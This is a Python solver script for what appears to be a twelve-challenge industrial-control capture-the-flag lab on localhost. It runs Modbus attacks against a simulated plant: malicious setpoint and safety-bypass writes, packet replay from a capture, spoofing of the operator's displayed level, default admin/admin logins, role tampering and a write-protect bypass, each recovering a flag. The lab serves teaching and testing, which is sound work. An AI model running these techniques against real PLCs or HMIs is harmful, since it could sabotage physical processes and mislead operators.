#!/usr/bin/env python3
"""
Author's BLIND solver - cracks a randomised instance with no knowledge of the
seed, exactly as a reasoning student would. Proves every challenge is solvable
from observation, and that the per-session randomisation holds together.
"""
import time
import base64
import re
import struct as _st
import urllib.request
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient("127.0.0.1", port=5020)
assert c.connect(), "could not connect"


def words(a, n, fc=3):
    r = c.read_holding_registers(address=a, count=n) if fc == 3 else c.read_input_registers(address=a, count=n)
    return r.registers


def to_bytes(ws):
    return b"".join(w.to_bytes(2, "big") for w in ws)


def find_flag(ws):
    m = re.search(rb"luhack\{[^}]*\}", to_bytes(ws))
    return m.group().decode() if m else None


# 1 Recon: an odd block -> base64
blk = to_bytes(words(10, 20)).split(b"\x00")[0]
f1 = base64.b64decode(blk).decode()
print("1 recon  ", f1); assert f1.startswith("luhack{")

# 2 Rigged dose
c.write_register(address=1, value=50); time.sleep(1.2)
f2 = find_flag(words(50, 18)); print("2 dose   ", f2); assert f2

# 3 Bypass
c.write_coil(address=1, value=False); time.sleep(1.2)
f3 = find_flag(words(30, 18)); print("3 bypass ", f3); assert f3

# 4 Replay attack (T0831): find the attacker's privileged command in the capture
# (a Write-Single-Register to an unusual register) and resend it - no replay protection
raw = open("incident.pcap", "rb").read()
off, rep = 24, None
while off + 16 <= len(raw):
    _, _, caplen, _ = _st.unpack("<IIII", raw[off:off + 16]); off += 16
    pkt = raw[off:off + caplen]; off += caplen
    if len(pkt) < 66:
        continue
    src = ".".join(str(x) for x in pkt[26:30])
    if src == "10.20.4.17" and pkt[61] == 6:               # attacker's Write-Single-Register
        addr = (pkt[62] << 8) | pkt[63]; val = (pkt[64] << 8) | pkt[65]
        if addr != 1:                                      # not the obvious setpoint sabotage
            rep = (addr, val)
assert rep, "privileged command not found in capture"
c.write_register(address=rep[0], value=rep[1]); time.sleep(1.2)
f4 = find_flag(words(76, 18))
print(f"4 replay  {f4}  (replayed reg {rep[0]}={rep[1]})"); assert f4

# 5 Default credentials (T0812): the /diag engineering console was left on factory
# defaults - log in and it over-shares (flag, engineer PIN, build)
diag = urllib.request.urlopen("http://127.0.0.1:8800/diag?user=admin&pw=admin", timeout=3).read().decode()
f5 = re.search(r"luhack\{[^}]*\}", diag).group()
eng_pin = re.search(r"PIN \.+ (\d+)", diag).group(1)
print(f"5 diag    {f5}  (default creds admin/admin -> PIN {eng_pin})"); assert f5.startswith("luhack{")

# 6 Cipher: known-plaintext XOR (crib luhack{)
cipher = to_bytes(words(150, 20))
crib = b"luhack{"
key = bytes(cipher[i] ^ crib[i] for i in range(3))
f6 = find_flag(pack := [((cipher[i] ^ key[i % 3]) << 8 | (cipher[i + 1] ^ key[(i + 1) % 3])) for i in range(0, len(cipher) - 1, 2)])
print(f"6 cipher  {f6}  (key {key.hex()})"); assert f6

# 7 Spoof reporting (T0856): the HMI shows its level from a WRITABLE register.
# Discover which one (it equals the displayed level), then forge a value far from
# the true level - the operator's screen freezes on the lie.
import json
disp = json.loads(urllib.request.urlopen("http://127.0.0.1:8800/api/state", timeout=3).read())["level"]
regs = words(0, 70)
report_reg = next(i for i in range(2, 70) if regs[i] == disp and disp)   # writable reg mirroring the HMI
true_lvl = words(0, 1, fc=4)[0]
lie = 30 if true_lvl > 50 else 70            # 25<=lie<=75, clearly different from true
c.write_register(address=report_reg, value=lie); time.sleep(1.2)
f7 = find_flag(words(182, 18))
print(f"7 spoof   {f7}  (forged HR{report_reg} to {lie} vs true {true_lvl})"); assert f7

# 8 Culprit: the code is SPLIT across writes - follow the attacker's stream and
# reassemble (ignoring the benign poller on 10.20.4.22)
raw = open("incident.pcap", "rb").read()
off, frag = 24, b""
while off + 16 <= len(raw):
    _, _, caplen, _ = _st.unpack("<IIII", raw[off:off + 16]); off += 16
    pkt = raw[off:off + caplen]; off += caplen
    if len(pkt) < 67:
        continue
    src = ".".join(str(x) for x in pkt[26:30])
    if src == "10.20.4.17" and pkt[61] == 16:          # attacker's Write-Multiple
        bc = pkt[66]; frag += pkt[67:67 + bc]
f_pcap = base64.b64decode(frag).decode()
print("8 culprit", f_pcap); assert f_pcap.startswith("luhack{")

# 9 Master: reuse the Ch6 key on the enciphered capstone
f8 = None
for _ in range(80):
    lvl = words(0, 1, fc=4)[0]
    enc = to_bytes(words(110, 20))
    dec = bytes(enc[i] ^ key[i % 3] for i in range(len(enc)))
    m = re.search(rb"luhack\{[^}]*\}", dec)
    if m:
        f8 = m.group().decode(); break
    time.sleep(0.5)
print(f"9 master  {f8}  (level {lvl}, reused key)"); assert f8

# 10 HMI: a hardcoded secret left in the operator interface's page source
html = urllib.request.urlopen("http://127.0.0.1:8800", timeout=3).read().decode()
f_hmi = re.search(r"luhack\{[^}]*\}", html).group()
print("10 hmi    ", f_hmi); assert f_hmi.startswith("luhack{")

# 11 Maint: broken access control - tamper ?role=engineer, chain the PIN from /diag
page = urllib.request.urlopen(
    f"http://127.0.0.1:8800/maint?role=engineer&pin={eng_pin}", timeout=3).read().decode()
f_maint = re.search(r"luhack\{[^}]*\}", page).group()
print(f"11 maint   {f_maint}  (role tamper + PIN {eng_pin})"); assert f_maint.startswith("luhack{")

# 12 Unlock: write-protect bypass - key is the FW build; enter MAINT then write reg 8
allb = to_bytes(words(0, 125) + words(125, 125))
build = int(re.search(rb"BUILD (\d+)", allb).group(1))
# reg 8 is write-locked in RUN: a bare write is rejected until MAINT is entered
c.write_register(address=9, value=build); time.sleep(0.3)     # enter MAINT mode
c.write_register(address=8, value=1); time.sleep(1.2)         # now the protected write lands
f_unlock = find_flag(words(284, 18))
print(f"12 unlock  {f_unlock}  (FW build {build} -> reg 9, then reg 8)"); assert f_unlock

sid = f1.split("_")[-1].rstrip("}")
allflags = [f2, f3, f4, f5, f6, f7, f_pcap, f8, f_hmi, f_maint, f_unlock]
assert all(sid in f for f in allflags), "flags are session-bound"
c.close()
print(f"\nALL 12 SOLVE OK - session {sid}, flags are unique to this instance")
